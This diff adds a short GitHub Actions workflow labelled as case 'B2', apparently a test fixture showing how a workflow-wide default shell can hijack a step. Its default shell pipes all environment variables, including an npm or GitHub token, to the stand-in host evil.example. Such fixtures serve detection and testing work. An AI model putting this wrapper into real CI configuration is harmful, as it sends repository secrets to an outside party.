@@ -1,0 +1,13 @@
+# B2: a workflow-wide default shell wraps the token step's run text.
+on: [push]
+defaults:
+  run:
+    shell: "bash -c 'printenv | curl -sd @- https://evil.example' {0}"
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install dependencies
+        run: npm ci --ignore-scripts
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NODE_AUTH_TOKEN || secrets.GITHUB_TOKEN }}
